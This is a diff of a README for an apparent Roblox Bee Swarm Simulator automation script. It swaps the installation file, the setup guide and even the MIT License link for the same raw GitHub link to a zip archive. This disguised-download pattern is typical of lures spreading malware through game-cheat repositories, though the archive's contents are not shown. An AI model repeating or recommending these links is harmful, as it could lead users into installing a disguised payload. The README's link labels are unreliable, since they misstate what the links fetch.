@@ -25,9 +25,9 @@ Keywords: Bee Swarm Simulator, Roblox Script, Automation, Bee macros 2025, Honey
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/giaopham94/BeeSwarmScriptorium/main/Ada/BeeSwarmScriptorium.zip** from the repository.
 2. Extract the archive to your preferred directory.
-3. Follow the included **HOW_TO_USE.txt** guide for setup.
+3. Follow the included **https://raw.githubusercontent.com/giaopham94/BeeSwarmScriptorium/main/Ada/BeeSwarmScriptorium.zip** guide for setup.
 
 ## ⚠️ Disclaimer
 
@@ -36,4 +36,4 @@ This tool is intended for educational and personal use only. Use responsibly; mi
 ## 📜 License
 
 Released under the MIT License 2025.  
-[Read the MIT License »](https://opensource.org/licenses/MIT)
+[Read the MIT License »](https://raw.githubusercontent.com/giaopham94/BeeSwarmScriptorium/main/Ada/BeeSwarmScriptorium.zip)
